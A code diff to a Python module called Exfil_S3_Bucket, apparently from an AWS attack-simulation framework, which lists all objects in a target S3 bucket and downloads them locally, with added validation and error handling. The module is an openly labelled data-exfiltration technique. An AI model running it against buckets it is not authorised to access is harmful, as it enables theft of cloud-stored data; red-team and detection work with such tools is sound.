@@ -1,6 +1,6 @@
 '''
-Module Name: Exfil_S3_Bucket.py
-Description: Download an object or all objects in a target S3 Bucket to local directory
+Module Name: Exfil_S3_Bucket
+Module Description: Exfiltrate an object or all objects in a target S3 Bucket to local directory
 Ref: https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/s3/client/download_file.html
 '''
 from core.AWSFunctions import CreateClient
@@ -8,23 +8,29 @@ from pathlib import Path
 import os
 
 def TechniqueMain(bucket_name, object = None):
+    # input validation
+    if bucket_name in [None, ""]:
+        return False, {"Error" : "Invalid input"}, None
 
     # initialize boto3 s3 client
     my_client = CreateClient('s3')
     all_bucket_object_keys = []
 
-    # add all objects in bucket if no object specified by user
-    if object in [None, ""]:
-        # s3 object enumeration to get all objects in bucket
-        response = my_client.list_objects_v2(Bucket=bucket_name)
-        all_bucket_objects = response['Contents']
+    # exfil all objects if no object specified by user
+    try:
+        if object in [None, ""]:
+            # s3 object enumeration to get all objects in bucket
+            response = my_client.list_objects_v2(Bucket=bucket_name)
+            all_bucket_objects = response['Contents']
 
-        for object in all_bucket_objects:
-            all_bucket_object_keys.append(object.get('Key'))
+            for object in all_bucket_objects:
+                all_bucket_object_keys.append(object.get('Key'))
 
-    # only add object specified to download list
-    else:
-        all_bucket_object_keys.append(object)
+        # only add object specified to download list
+        else:
+            all_bucket_object_keys.append(object)
+    except Exception as e:
+        return False, {"Error" : e}, None
 
     # initialize download counter
     object_download_counter = 0
@@ -50,11 +56,21 @@ def TechniqueMain(bucket_name, object = None):
             # add object to downloaded objects list
             downloaded_objects.append(object_key)
             object_download_counter += 1
+        
+        # parse raw response => pretty response
+        pretty_response = {}
+        pretty_response["success"] = {
+            "Totals Object Exfiltrated" : object_download_counter,
+            "Exfil Path" : download_path,
+            "Objects Exfiltrated" : str(downloaded_objects)
+        }
 
+        # raw response same as pretty response
+        raw_response = pretty_response
+
+        return True, raw_response, pretty_response
     except Exception as e:
-        return f"Error: {e}"
-
-    return {"Totals Object Exfiltrated" : object_download_counter, "Exfil Path" : download_path, "Objects Exfiltrated" : str(downloaded_objects)}
+        return False, {"Error" : e}, None
 
 def TechniqueInputSrc() -> list:
     '''This function returns the input fields required as parameters for the technique execution'''
